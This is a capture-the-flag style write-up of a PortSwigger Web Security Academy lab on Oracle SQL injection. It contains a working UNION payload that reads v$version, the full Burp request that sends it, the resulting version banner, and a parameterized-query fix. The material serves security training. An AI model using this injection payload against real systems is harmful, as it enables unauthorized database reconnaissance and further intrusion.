# Lab: SQL injection attack, querying the database type and version on Oracle

- **Platform:** PortSwigger Web Security Academy
- **Difficulty:** Practitioner
- **Target:** `/filter?category=`
- **Database Engine:** Oracle

---

## Vulnerability Analysis

The category parameter is concatenated directly into an active SQL query. To extract the database version via a `UNION` attack on Oracle, two core requirements must be satisfied:

1. **Column & Type Alignment:** Match the exact column count and string data types of the original query (2 text/string columns).
2. **Oracle Syntax Rules:** Explicitly query from a valid table source (`FROM v$version`), as Oracle rejects table-less `SELECT` statements (unlike MySQL/PostgreSQL).

---

## Exploitation (PoC)

### Payload

```text
' UNION SELECT banner, 'def' FROM v$version--

```

### Burp Suite Repeater Request

```http
GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+banner,+'def'+FROM+v$version-- HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE

```

### Extracted Database Metadata

The response rendered the active Oracle database banner:

- `CORE 11.2.0.2.0 Production`
- `NLSRTL Version 11.2.0.2.0 - Production`

---

## Remediation

Ensure all dynamic category filtering is handled using parameterized queries (prepared statements) to isolate user-supplied strings from the SQL execution engine.




